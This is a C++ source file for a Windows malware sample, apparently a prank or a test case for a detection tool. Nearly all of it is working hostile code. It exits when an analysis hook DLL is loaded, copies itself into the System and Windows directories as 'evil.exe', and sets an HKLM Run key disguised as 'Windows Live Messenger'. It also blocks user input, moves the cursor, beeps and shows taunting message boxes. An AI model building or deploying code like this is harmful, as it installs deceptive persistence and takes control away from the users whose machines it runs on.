#include <windows.h>
#include <fstream>

bool checkIfBlockingInputIsPossible();
void setRegister();
void radkumWebsite();
void maliciousBehaviour();

constexpr size_t LOOP_NUMBER = 3;

using SleepFnType = VOID (*WINAPI)(DWORD);
using BlockInputFnType = BOOL(*WINAPI)(BOOL);
using SetCursorPosFnType = BOOL(*WINAPI)(int, int);
using ShellExecuteAFnType = HINSTANCE(*WINAPI)(HWND, LPCSTR, LPCSTR, LPCSTR, LPCSTR, INT);
using RegSetValueExAFnType = LSTATUS(*WINAPI)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
using BeepFnType = BOOL(*WINAPI)(DWORD, DWORD);
using MessageBoxAFnType = BOOL(*WINAPI)(HWND, LPCSTR, LPCSTR, INT);

SleepFnType g_Sleep = nullptr;
BlockInputFnType g_BlockInput = nullptr;
SetCursorPosFnType g_SetCursorPos = nullptr;
ShellExecuteAFnType g_ShellExecuteA = nullptr;
RegSetValueExAFnType g_RegSetValueExA = nullptr;
BeepFnType g_Beep = nullptr;
MessageBoxAFnType g_MessageBoxA = nullptr;

bool loadFunctions() {
    HMODULE user32 = ::LoadLibraryA("user32.dll");
    if (!user32) return false;
    HMODULE kernel32 = ::LoadLibraryA("kernel32.dll");
    if (!kernel32) return false;
    HMODULE shell32 = ::LoadLibraryA("shell32.dll");
    if (!shell32) return false;
    HMODULE advapi32 = ::LoadLibraryA("advapi32.dll");
    if (!advapi32) return false;

    g_Sleep = (SleepFnType)::GetProcAddress(kernel32, "Sleep");
    g_Beep = (BeepFnType)::GetProcAddress(kernel32, "Beep");
    g_BlockInput = (BlockInputFnType)::GetProcAddress(user32, "BlockInput");
    g_SetCursorPos = (SetCursorPosFnType)::GetProcAddress(user32, "SetCursorPos");
    g_MessageBoxA = (MessageBoxAFnType)::GetProcAddress(user32, "MessageBoxA");
    g_ShellExecuteA = (ShellExecuteAFnType)::GetProcAddress(shell32, "ShellExecuteA");
    g_RegSetValueExA = (RegSetValueExAFnType)::GetProcAddress(advapi32, "RegSetValueExA");

    if (!g_Sleep || !g_Beep || !g_BlockInput || !g_SetCursorPos || !g_MessageBoxA || !g_ShellExecuteA || !g_RegSetValueExA) return false;

    return true;
}
bool isHooked() {
    HMODULE mod = GetModuleHandleA("HookPerformer.dll");
    if (!mod) return false;
    return true;
}
int main()
{
    if (isHooked()) {
        return 0;
    }
    if (!loadFunctions()) {
        return -1;
    }

    //check if we run as administrator
    if (!checkIfBlockingInputIsPossible()) {
        return -1;
    }

    setRegister();
    g_Sleep(1000);
    
    //show messageBox
    if (g_MessageBoxA(NULL, "I'm watching you", "Windows", MB_OKCANCEL) == IDCANCEL)
    {
        g_MessageBoxA(NULL, "HAHAHAHA!", "radkum", MB_OK);
    }

    //sleep 2 seconds
    g_Sleep(2000);

    for(size_t i = 0; i < LOOP_NUMBER; i++)
    {
        radkumWebsite();
       
        //sleep 2 seconds
        g_Sleep(2000);

        maliciousBehaviour();

        //sleep 2 seconds
        g_Sleep(2000);
    }
    
    return 0;
}
void maliciousBehaviour() {
    int x = 0;
    int y = 0;
    for (size_t i = 0; i < LOOP_NUMBER; i++)
    {
        x += 160;
        y += 90;

        g_BlockInput(TRUE);
        g_SetCursorPos(x, y);

        //sleep 0.5 seconds
        g_Sleep(500);
    }

    //Sleep(1000);
    int freq = 100;
    for (size_t i = 0; i < LOOP_NUMBER; i++)
    {
        //printf("inner loop counter: %d\n", loop);
        g_Beep(freq, 100);

        //sleep 0.5 seconds
        g_Sleep(500);
        freq++;
    }
}

void radkumWebsite() {
    char websiteAddress[MAX_PATH] = "https://github.com/radkum";
    g_ShellExecuteA(NULL, "open", websiteAddress, NULL, NULL, SW_MAXIMIZE);

    g_MessageBoxA(
        NULL,
        "Oh,you want see my project? Welcome!",
        "radkum",
        MB_OK);
}

bool checkIfBlockingInputIsPossible() {
    g_BlockInput(TRUE);
    if (GetLastError() == 0x05 /*ACCESS_DENIED*/) {
        printf("Please run app as administrator!\n");
        return false;
    }
    g_BlockInput(FALSE);

    return true;
}

void setRegister() {
    char system[MAX_PATH];
    char windows[MAX_PATH];
    char pathtofile[MAX_PATH];
    HMODULE GetModH = GetModuleHandle(NULL);
    GetModuleFileNameA(GetModH, pathtofile, sizeof(pathtofile));
    GetSystemDirectoryA(system, sizeof(system));
    GetWindowsDirectoryA(windows, sizeof(windows));
    strcat_s(system, "\\evil.exe");
    strcat_s(windows, "\\evil.exe");
    CopyFileA(pathtofile, system, false);
    CopyFileA(pathtofile, windows, false);
    HKEY hKey;
    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "Windows Live Messenger", 0, REG_SZ, (const unsigned char*)system, sizeof(system));
    RegCloseKey(hKey);
}
